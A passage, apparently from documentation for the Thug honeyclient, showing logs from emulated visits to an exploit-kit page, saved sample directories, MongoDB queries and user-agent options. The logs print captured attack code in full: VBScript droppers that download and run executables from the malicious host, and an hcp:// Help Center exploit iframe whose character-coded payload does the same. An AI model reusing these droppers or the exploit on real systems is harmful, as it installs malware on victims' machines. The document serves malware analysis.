       W.eXeC <span class="s2">&quot;taskkill /F /IM wm&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;player.e&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;xe&quot;</span>:W.eXeC <span class="s2">&quot;taskkill /F /IM realplay.ex&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;e&quot;</span>:Set <span class="nv">g</span><span class="o">=</span>o.GetFile<span class="o">(</span>e.GetSpecialFolder<span class="o">(</span><span class="m">3</span>-1<span class="o">)</span> <span class="p">&amp;</span> <span class="s2">&quot;\&quot; &amp; StrReverse(&quot;</span>bv.l<span class="s2">&quot;) &amp; &quot;</span>s<span class="s2">&quot;):g.Delete:WScript.Sleep w:Set g=o.GetFile(b):Eval(&quot;</span>g.Delete<span class="s2">&quot;)</span>

<span class="s2">       [2012-07-02 19:15:37] [Windows Script Host Run - Stage 2] Downloading from URL http://[omitted]/w.php?e=5&amp;f=b081d</span>
<span class="s2">       [2012-07-02 19:15:43] [HTTP] URL: http://[omitted]/w.php?e=5&amp;f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
<span class="s2">       [2012-07-02 19:15:45] [Windows Script Host Run - Stage 2] Saving file d328b5a123bce1c0d20d763ad745303a</span>
<span class="s2">       [2012-07-02 19:15:45] &lt;object classid=&quot;</span>clsid:d27cdb6e-ae6d-11cf-96b8-444553540000<span class="s2">&quot; height=&quot;</span><span class="m">10</span><span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; width=&quot;</span><span class="m">10</span><span class="s2">&quot;&gt;&lt;param name=&quot;</span>movie<span class="s2">&quot; value=&quot;</span>data/field.swf<span class="s2">&quot;&gt;&lt;/param&gt;&lt;param name=&quot;</span>allowScriptAccess<span class="s2">&quot; value=&quot;</span>always<span class="s2">&quot;&gt;&lt;/param&gt;&lt;param name=&quot;</span>Play<span class="s2">&quot; value=&quot;</span><span class="m">0</span><span class="s2">&quot;&gt;&lt;/param&gt;&lt;embed allowscriptaccess=&quot;</span>always<span class="s2">&quot; height=&quot;</span><span class="m">10</span><span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; name=&quot;</span>swf_id<span class="s2">&quot; src=&quot;</span>data/field.swf<span class="s2">&quot; type=&quot;</span>application/x-shockwave-flash<span class="s2">&quot; width=&quot;</span><span class="m">10</span><span class="s2">&quot;&gt;&lt;/embed&gt;&lt;/object&gt;</span>
<span class="s2">       [2012-07-02 19:15:45] &lt;param name=&quot;</span>b<span class="s2">&quot; value=&quot;</span><span class="m">56</span>:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">       [2012-07-02 19:15:45] &lt;param name=&quot;</span>movie<span class="s2">&quot; value=&quot;</span>data/field.swf<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">       [2012-07-02 19:15:45] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf</span>
<span class="s2">       [2012-07-02 19:15:52] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
<span class="s2">       [2012-07-02 19:15:52] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)</span>
<span class="s2">       [2012-07-02 19:15:52] &lt;param name=&quot;</span>allowScriptAccess<span class="s2">&quot; value=&quot;</span>always<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">       [2012-07-02 19:15:52] &lt;param name=&quot;</span>Play<span class="s2">&quot; value=&quot;</span><span class="m">0</span><span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">       [2012-07-02 19:15:52] &lt;embed allowscriptaccess=&quot;</span>always<span class="s2">&quot; height=&quot;</span><span class="m">10</span><span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; name=&quot;</span>swf_id<span class="s2">&quot; src=&quot;</span>data/field.swf<span class="s2">&quot; type=&quot;</span>application/x-shockwave-flash<span class="s2">&quot; width=&quot;</span><span class="m">10</span><span class="s2">&quot;&gt;&lt;/embed&gt;</span>
<span class="s2">       [2012-07-02 19:15:52] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf</span>
<span class="s2">       [2012-07-02 19:15:53] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
<span class="s2">       [2012-07-02 19:15:53] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)</span>
<span class="s2">       [2012-07-02 19:15:53] Saving log analysis at /tmp/thug/logs/baa880d8d79c3488f2c0557be24cca6b/20120702191511</span>
</pre></div>
</td></tr></table></div>
<p>Let’s take a look at the directory which contains the logs for this session</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>~ $ <span class="nb">cd</span> /tmp/thug/logs/baa880d8d79c3488f2c0557be24cca6b/20120702191511
/tmp/thug/logs/baa880d8d79c3488f2c0557be24cca6b/20120702191511 $ ls -lhR
.:
total 232K
-rw-r--r-- <span class="m">1</span> buffer buffer <span class="m">1008</span> Jul  <span class="m">2</span> <span class="m">19</span>:15 502da89357ca5d7c85dc7a67f8977b21
-rw-r--r-- <span class="m">1</span> buffer buffer  81K Jul  <span class="m">2</span> <span class="m">19</span>:15 analysis.xml
drwxr-xr-x <span class="m">6</span> buffer buffer  <span class="m">176</span> Jul  <span class="m">2</span> <span class="m">19</span>:15 application
-rwxr-xr-x <span class="m">1</span> buffer buffer  89K Jul  <span class="m">2</span> <span class="m">19</span>:15 d328b5a123bce1c0d20d763ad745303a
-rw-r--r-- <span class="m">1</span> buffer buffer  51K Jul  <span class="m">2</span> <span class="m">19</span>:15 Ryp.jar
drwxr-xr-x <span class="m">3</span> buffer buffer   <span class="m">72</span> Jul  <span class="m">2</span> <span class="m">19</span>:15 text

./application:
total <span class="m">0</span>
drwxr-xr-x <span class="m">2</span> buffer buffer <span class="m">96</span> Jul  <span class="m">2</span> <span class="m">19</span>:15 java-archive
drwxr-xr-x <span class="m">2</span> buffer buffer <span class="m">96</span> Jul  <span class="m">2</span> <span class="m">19</span>:15 pdf
drwxr-xr-x <span class="m">2</span> buffer buffer <span class="m">96</span> Jul  <span class="m">2</span> <span class="m">19</span>:15 x-msdownload
drwxr-xr-x <span class="m">2</span> buffer buffer <span class="m">96</span> Jul  <span class="m">2</span> <span class="m">19</span>:15 x-shockwave-flash

./application/java-archive:
total 52K
-rw-r--r-- <span class="m">1</span> buffer buffer 51K Jul  <span class="m">2</span> <span class="m">19</span>:15 e3639fde6ddf7fd0182fff9757143ff2

./application/pdf:
total 16K
-rw-r--r-- <span class="m">1</span> buffer buffer 15K Jul  <span class="m">2</span> <span class="m">19</span>:15 3660fe0e4acd23ac13f3d043eebd2bbc

./application/x-msdownload:
total 92K
-rw-r--r-- <span class="m">1</span> buffer buffer 89K Jul  <span class="m">2</span> <span class="m">19</span>:15 d328b5a123bce1c0d20d763ad745303a

./application/x-shockwave-flash:
total <span class="m">4</span>.0K
-rw-r--r-- <span class="m">1</span> buffer buffer <span class="m">1008</span> Jul  <span class="m">2</span> <span class="m">19</span>:15 502da89357ca5d7c85dc7a67f8977b21

./text:
total <span class="m">0</span>
drwxr-xr-x <span class="m">2</span> buffer buffer <span class="m">144</span> Jul  <span class="m">2</span> <span class="m">19</span>:15 html

./text/html:
total 72K
-rw-r--r-- <span class="m">1</span> buffer buffer 68K Jul  <span class="m">2</span> <span class="m">19</span>:15 95ee609e6e3b69c2d9e68f34ff4a4335
-rw-r--r-- <span class="m">1</span> buffer buffer <span class="m">878</span> Jul  <span class="m">2</span> <span class="m">19</span>:15 d26b9b1a1f667004945d1d000cf4f19e
</pre></div>
</div>
<p>If the MAEC 1.1 logging mode is enabled, the file <em>analysis.xml</em> contains the URL analysis
results saved in MAEC 1.1 format (please refer to <a class="reference external" href="http://maec.mitre.org">http://maec.mitre.org</a> for additional details).
MAEC 1.1 logging is no longer supported from Thug 0.9.44 onwards.</p>
<p>Please notice that all the files downloaded during the URL analysis are saved in this directory
based on their Content-Type for convenience (if the File logging mode is enabled).</p>
<p>Moreover if MongoDB is installed the information you can see in this directory are saved in the
database instance too. Let’s take a deeper look using pymongo (you can get the same result by
using the MongoDB client <em>mongo</em>).</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>~/thug/src $ python
Python 2.7.3 (default, Jun 12 2012, 10:22:50)
[GCC 4.5.3] on linux2
Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
&gt;&gt;&gt; import pymongo
&gt;&gt;&gt; connection = pymongo.Connection()
&gt;&gt;&gt; db = connection.thug
&gt;&gt;&gt; url = db.urls.find_one({&#39;url&#39; : &#39;http://[omitted]/main.php?page=8c6c59becaa0da07&#39;})
&gt;&gt;&gt; url
{u&#39;url&#39;: u&#39;http://[omitted]/main.php?page=8c6c59becaa0da07&#39;, u&#39;_id&#39;: ObjectId(&#39;4ff1b8efe732795951000000&#39;)}
&gt;&gt;&gt; for sample in db.samples.find({&#39;url_id&#39;: url[&#39;_id&#39;]}):
...     print sample
...

{u&#39;_id&#39;: ObjectId(&#39;4ff1b8f4e732795951000001&#39;), u&#39;url&#39;: u&#39;http://[omitted]/Ryp.jar&#39;, u&#39;type&#39;: u&#39;JAR&#39;, u&#39;sha1&#39;: u&#39;5fffd5cc4a372a6c2a826a850a955cb6a4042272&#39;, u&#39;url_id&#39;: ObjectId(&#39;4ff1b8efe732795951000000&#39;), u&#39;data&#39;: u&#39;[skipped]&#39;, u&#39;md5&#39;: u&#39;e3639fde6ddf7fd0182fff9757143ff2&#39;}
{u&#39;_id&#39;: ObjectId(&#39;4ff1b8f7e732795951000002&#39;), u&#39;url&#39;: u&#39;http://[omitted]/w.php?f=b081d&amp;e=2&#39;, u&#39;type&#39;: u&#39;PE&#39;, u&#39;sha1&#39;: u&#39;1445e7d338d0d7c20f1d2329f4d653cce1562cc8&#39;, u&#39;url_id&#39;: ObjectId(&#39;4ff1b8efe732795951000000&#39;), u&#39;data&#39;:  u&#39;[skipped]&#39;, u&#39;md5&#39;: u&#39;d328b5a123bce1c0d20d763ad745303a&#39;}
[..]
&gt;&gt;&gt; for event in db.events.find({&#39;url_id&#39;: url[&#39;_id&#39;]}):
...     print event
...
{u&#39;MAEC&#39;: u&#39;&lt;MAEC_Bundle xmlns:ns1=&quot;http://xml/metadataSharing.xsd&quot; xmlns=&quot;http://maec.mitre.org/XMLSchema/maec-core-1&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maec.mitre.org/XMLSchema/maec-core-1 file:MAEC_v1.1.xsd&quot; id=&quot;maec:thug:bnd:1&quot; schema_version=&quot;1.100000&quot;&gt;
[..]
</pre></div>
</div>
</div>
<div class="section" id="browser-personality">
<h2>Browser personality<a class="headerlink" href="#browser-personality" title="Permalink to this headline">¶</a></h2>
<p>If no additional option (other than the URL) is provided the emulated browser personality is
Internet Explorer 6.0 on Windows XP platform. This choice is usually quite interesting for
the really simple reason a lot of exploit kits out there try to exploit a vulnerability in Microsoft
Data Access Components (MDAC) which allows remote code execution if facing such personality.
Thug emulates perfectly this exploit thus allowing to quite easily download a malicious
executable for later analysis.</p>
<p>If there’s the need to test the content that would be served while using a different browser
personality the <em>-u (–useragent)</em> option should be used. In the following example, the
option <em>-u winxpie80</em> is used in order to test the content served when surfing the same
page with Internet Explorer 8.0 on Windows XP platform.</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>~ $ thug -u winxpie80 <span class="s2">&quot;http://[omitted]/main.php?page=8c6c59becaa0da07&quot;</span>
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:21:00<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07 <span class="o">(</span>Status: <span class="m">200</span>, Referrer: None<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:21:00<span class="o">]</span> &lt;applet <span class="nv">archive</span><span class="o">=</span><span class="s2">&quot;Ryp.jar&quot;</span> <span class="nv">code</span><span class="o">=</span><span class="s2">&quot;sIda.sIda&quot;</span>&gt;&lt;param <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;b&quot;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&quot;56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12&quot;</span>&gt;&lt;/param&gt;&lt;/applet&gt;
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:21:00<span class="o">]</span> <span class="o">[</span>Navigator URL Translation<span class="o">]</span> Ryp.jar --&gt;  http://<span class="o">[</span>omitted<span class="o">]</span>/Ryp.jar
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:21:02<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/Ryp.jar <span class="o">(</span>Status: <span class="m">200</span>, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:21:03<span class="o">]</span> Saving applet Ryp.jar
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:21:03<span class="o">]</span> ActiveXObject: msxml2.xmlhttp
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:21:03<span class="o">]</span> ActiveXObject: acropdf.pdf
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:21:03<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:21:03<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:21:03<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:21:03<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:21:03<span class="o">]</span> Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:21:03<span class="o">]</span> ActiveXObject: shockwaveflash.shockwaveflash.10
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:21:03<span class="o">]</span> <span class="o">[</span>Navigator URL Translation<span class="o">]</span> ./data/ap1.php?f<span class="o">=</span>b081d --&gt;  http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap1.php?f<span class="o">=</span>b081d
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:21:05<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap1.php?f<span class="o">=</span>b081d <span class="o">(</span>Status: <span class="m">200</span>, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:21:05<span class="o">]</span> Microsoft Internet Explorer HCP Scheme Detected
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:21:05<span class="o">]</span> Microsoft Windows Help Center Malformed Escape Sequences Incorrect Handling
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:21:05<span class="o">]</span> <span class="o">[</span>AST<span class="o">]</span>: Eval argument length &gt; <span class="m">64</span>
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:21:05<span class="o">]</span> <span class="o">[</span>Windows Script Host Run<span class="o">]</span> Command:
cmd /c <span class="nb">echo</span> <span class="nv">B</span><span class="o">=</span><span class="s2">&quot;l.vbs&quot;</span>:With CreateObject<span class="o">(</span><span class="s2">&quot;MSXML2.XMLHTTP&quot;</span><span class="o">)</span>:.open <span class="s2">&quot;GET&quot;</span>,<span class="s2">&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;</span>,false:.send<span class="o">()</span>:Set <span class="nv">A</span> <span class="o">=</span> CreateObject<span class="o">(</span><span class="s2">&quot;Scripting.FileSystemObject&quot;</span><span class="o">)</span>:Set <span class="nv">D</span><span class="o">=</span>A.CreateTextFile<span class="o">(</span>A.GetSpecialFolder<span class="o">(</span><span class="m">2</span><span class="o">)</span> + <span class="s2">&quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;</span>WScript.Shell<span class="s2">&quot;).Run A.GetSpecialFolder(2) + &quot;</span><span class="se">\&quot;</span> + B &gt; %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> taskkill /F /IM helpctr.exe

<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:21:05<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage <span class="m">1</span><span class="o">]</span> Code:
cmd /c <span class="nb">echo</span> <span class="nv">B</span><span class="o">=</span><span class="s2">&quot;l.vbs&quot;</span>:With CreateObject<span class="o">(</span><span class="s2">&quot;MSXML2.XMLHTTP&quot;</span><span class="o">)</span>:.open <span class="s2">&quot;GET&quot;</span>,<span class="s2">&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;</span>,false:.send<span class="o">()</span>:Set <span class="nv">A</span> <span class="o">=</span> CreateObject<span class="o">(</span><span class="s2">&quot;Scripting.FileSystemObject&quot;</span><span class="o">)</span>:Set <span class="nv">D</span><span class="o">=</span>A.CreateTextFile<span class="o">(</span>A.GetSpecialFolder<span class="o">(</span><span class="m">2</span><span class="o">)</span> + <span class="s2">&quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;</span>WScript.Shell<span class="s2">&quot;).Run A.GetSpecialFolder(2) + &quot;</span><span class="se">\&quot;</span> + B &gt; %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> taskkill /F /IM helpctr.exe
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:21:05<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage <span class="m">1</span><span class="o">]</span> Downloading from URL http://<span class="o">[</span>omitted<span class="o">]</span>/data/hcp_vbs.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">d</span><span class="o">=</span><span class="m">0</span>
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:21:06<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/data/hcp_vbs.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">d</span><span class="o">=</span><span class="m">0</span> <span class="o">(</span>Status: <span class="m">200</span>, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:21:06<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage <span class="m">1</span><span class="o">]</span> Saving file d26b9b1a1f667004945d1d000cf4f19e
<span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:21:06<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage <span class="m">2</span><span class="o">]</span> Code:
<span class="nv">w</span><span class="o">=</span><span class="m">3000</span>:x<span class="o">=</span><span class="m">200</span>:y<span class="o">=</span><span class="m">1</span>:z<span class="o">=</span>false:a <span class="o">=</span> <span class="s2">&quot;http://[omitted]/w.php?e=5&amp;f=b081d&quot;</span>:Set <span class="nv">e</span> <span class="o">=</span> Createobject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;tcejbOmetsySeliF.gnitpircS&quot;</span><span class="o">))</span>:Set <span class="nv">f</span><span class="o">=</span>e.GetSpecialFolder<span class="o">(</span><span class="m">2</span><span class="o">)</span>:b <span class="o">=</span> f <span class="p">&amp;</span> <span class="s2">&quot;\exe.ex2&quot;</span>:b<span class="o">=</span>Replace<span class="o">(</span>b,Month<span class="o">(</span><span class="s2">&quot;2010-02-16&quot;</span><span class="o">)</span>,<span class="s2">&quot;e&quot;</span><span class="o">)</span>:OT <span class="o">=</span> <span class="s2">&quot;GET&quot;</span>:Set <span class="nv">c</span> <span class="o">=</span> CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;PTTHLMX.2LMXSM&quot;</span><span class="o">))</span>:Set <span class="nv">d</span> <span class="o">=</span> CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;ertS.BDODA&quot;</span><span class="o">)</span> <span class="p">&amp;</span> <span class="s2">&quot;am&quot;</span><span class="o">)</span>
Set <span class="nv">o</span><span class="o">=</span>Createobject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;tcejbOmetsySeliF.gnitpircS&quot;</span><span class="o">))</span>
On Error resume next
c.open OT, a, z:c.send<span class="o">()</span>
If c.Status <span class="o">=</span> x Then
d.Open:d.Type <span class="o">=</span> y:d.Write c.ResponseBody:d.SaveToFile b:d.Close
End If
Set <span class="nv">w</span><span class="o">=</span>CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;llehS.&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;tpi&quot;</span><span class="p">&amp;</span><span class="s2">&quot;rcSW&quot;</span><span class="o">))</span>
Eval<span class="o">(</span>Replace<span class="o">(</span><span class="s2">&quot;W.ex2c b&quot;</span>, Month<span class="o">(</span><span class="s2">&quot;2010-02-16&quot;</span><span class="o">)</span>, <span class="s2">&quot;E&quot;</span><span class="o">))</span>
W.eXeC <span class="s2">&quot;taskkill /F /IM wm&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;player.e&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;xe&quot;</span>:W.eXeC <span class="s2">&quot;taskkill /F /IM realplay.ex&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;e&quot;</span>:Set <span class="nv">g</span><span class="o">=</span>o.GetFile<span class="o">(</span>e.GetSpecialFolder<span class="o">(</span><span class="m">3</span>-1<span class="o">)</span> <span class="p">&amp;</span> <span class="s2">&quot;\&quot; &amp; StrReverse(&quot;</span>bv.l<span class="s2">&quot;) &amp; &quot;</span>s<span class="s2">&quot;):g.Delete:WScript.Sleep w:Set g=o.GetFile(b):Eval(&quot;</span>g.Delete<span class="s2">&quot;)</span>

<span class="s2">[2012-07-02 19:21:06] [Windows Script Host Run - Stage 2] Downloading from URL http://[omitted]/w.php?e=5&amp;f=b081d</span>
<span class="s2">[2012-07-02 19:21:09] [HTTP] URL: http://[omitted]/w.php?e=5&amp;f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
<span class="s2">[2012-07-02 19:21:11] [Windows Script Host Run - Stage 2] Saving file d328b5a123bce1c0d20d763ad745303a</span>
<span class="s2">[2012-07-02 19:21:11] &lt;object classid=&quot;</span>clsid:d27cdb6e-ae6d-11cf-96b8-444553540000<span class="s2">&quot; height=&quot;</span><span class="m">10</span><span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; width=&quot;</span><span class="m">10</span><span class="s2">&quot;&gt;&lt;param name=&quot;</span>movie<span class="s2">&quot; value=&quot;</span>data/field.swf<span class="s2">&quot;&gt;&lt;/param&gt;&lt;param name=&quot;</span>allowScriptAccess<span class="s2">&quot; value=&quot;</span>always<span class="s2">&quot;&gt;&lt;/param&gt;&lt;param name=&quot;</span>Play<span class="s2">&quot; value=&quot;</span><span class="m">0</span><span class="s2">&quot;&gt;&lt;/param&gt;&lt;embed allowscriptaccess=&quot;</span>always<span class="s2">&quot; height=&quot;</span><span class="m">10</span><span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; name=&quot;</span>swf_id<span class="s2">&quot; src=&quot;</span>data/field.swf<span class="s2">&quot; type=&quot;</span>application/x-shockwave-flash<span class="s2">&quot; width=&quot;</span><span class="m">10</span><span class="s2">&quot;&gt;&lt;/embed&gt;&lt;/object&gt;</span>
<span class="s2">[2012-07-02 19:21:11] &lt;param name=&quot;</span>b<span class="s2">&quot; value=&quot;</span><span class="m">56</span>:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:21:11] &lt;iframe height=&quot;</span><span class="m">0</span><span class="s2">&quot; src=&quot;</span>hcp://services/search?query<span class="o">=</span>anything<span class="p">&amp;</span>amp<span class="p">;</span><span class="nv">topic</span><span class="o">=</span>hcp://system/sysinfo/sysinfomain.htm%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A..%5C..%5Csysinfomain.htm%u003fsvr<span class="o">=</span><span class="p">&amp;</span>lt<span class="p">;</span>script defer<span class="p">&amp;</span>gt<span class="p">;</span>eval<span class="o">(</span>Run<span class="o">(</span>String.fromCharCode<span class="o">(</span><span class="m">99</span>,109,100,32,47,99,32,101,99,104,111,32,66,61,34,108,46,118,98,115,34,58,87,105,116,104,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,77,83,88,77,76,50,46,88,77,76,72,84,84,80,34,41,58,46,111,112,101,110,32,34,71,69,84,34,44,34,104,116,116,112,58,47,47,103,104,97,110,97,114,112,111,119,101,114,46,110,101,116,47,100,97,116,97,47,104,99,112,95,118,98,115,46,112,104,112,63,102,61,98,48,56,49,100,38,100,61,48,34,44,102,97,108,115,101,58,46,115,101,110,100,40,41,58,83,101,116,32,65,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,83,99,114,105,112,116,105,110,103,46,70,105,108,101,83,121,115,116,101,109,79,98,106,101,99,116,34,41,58,83,101,116,32,68,61,65,46,67,114,101,97,116,101,84,101,120,116,70,105,108,101,40,65,46,71,101,116,83,112,101,99,105,97,108,70,111,108,100,101,114,40,50,41,32,43,32,34,92,34,32,43,32,66,41,58,68,46,87,114,105,116,101,76,105,110,101,32,46,114,101,115,112,111,110,115,101,84,101,120,116,58,69,110,100,32,87,105,116,104,58,68,46,67,108,111,115,101,58,67,114,101,97,116,101,79,98,106,101,99,116,40,34,87,83,99,114,105,112,116,46,83,104,101,108,108,34,41,46,82,117,110,32,65,46,71,101,116,83,112,101,99,105,97,108,70,111,108,100,101,114,40,50,41,32,43,32,34,92,34,32,43,32,66,32,62,32,37,84,69,77,80,37,92,92,108,46,118,98,115,32,38,38,32,37,84,69,77,80,37,92,92,108,46,118,98,115,32,38,38,32,116,97,115,107,107,105,108,108,32,47,70,32,47,73,77,32,104,101,108,112,99,116,114,46,101,120,101<span class="o">)))</span><span class="p">;&amp;</span>lt<span class="p">;</span>/script<span class="p">&amp;</span>gt<span class="p">;</span><span class="s2">&quot; width=&quot;</span><span class="m">0</span><span class="s2">&quot;&gt;&lt;/iframe&gt;</span>
<span class="s2">[2012-07-02 19:21:11] [iframe redirection] http://[omitted]/main.php?page=8c6c59becaa0da07 -&gt; hcp://services/search?query=anything&amp;topic=hcp://system/sysinfo/sysinfomain.htm%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A..%5C..%5Csysinfomain.htm%u003fsvr=&lt;script 